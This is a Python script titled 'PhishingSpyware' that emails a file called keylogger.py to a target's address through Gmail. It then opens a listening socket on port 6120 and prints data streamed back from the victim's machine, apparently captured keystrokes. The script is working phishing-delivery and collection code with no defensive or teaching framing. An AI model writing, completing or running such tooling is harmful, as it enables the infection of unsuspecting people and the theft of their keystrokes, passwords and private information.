import pyfiglet
from termcolor import cprint
import smtplib
import email
from time import sleep
import socket
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

filetext = "subject.txt"
with open(filetext, "r") as txt:
		body = txt.read()
#ody = "This is an email with attachment sent from Python"

message = MIMEMultipart()

message.attach(MIMEText(body, "plain"))

filename = "keylogger.py"

with open(filename, "rb") as attachment:
	part = MIMEBase("application", "octet-stream")
	part.set_payload(attachment.read())

encoders.encode_base64(part)

part.add_header(
    "Content-Disposition",
    f"attachment; filename= {filename}",
)

message.attach(part)
text = message.as_string()

def send_mail(email, sent_email, password, message):
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, sent_email, message)

cprint(pyfiglet.figlet_format("PhishingSpyware", font="slant"), "green")
cprint(pyfiglet.figlet_format("Developed by SOSAkornut", font="digital"), "green")

email = input("Gmail: ")
password = input("App password: ")
send = input("What email you wanna send it to: ")
#fileText = input("Directory of email subject=")

s = socket.socket()
host_name = socket.gethostname()
s_ip = socket.gethostbyname(host_name)
port = 6120

s.bind((host_name, port))
s.listen(1)

print("[*] Waiting for target to connect")
send_mail(email, send, password, text)

conn, add = s.accept()
cprint(f"Recieved connection from {add[0]}", "green")

while True:
	try:
		sleep(3)
		message = conn.recv(1024)
		message = message.decode()
		cprint(message, "cyan")
	except ConnectionResetError:
		cprint(f"[-] The target {add[0]} has been disconnected", "red")
		exit(0)

#with open(fileText) as f:
#	lines = f.readlines()
#	lines = lines[0]
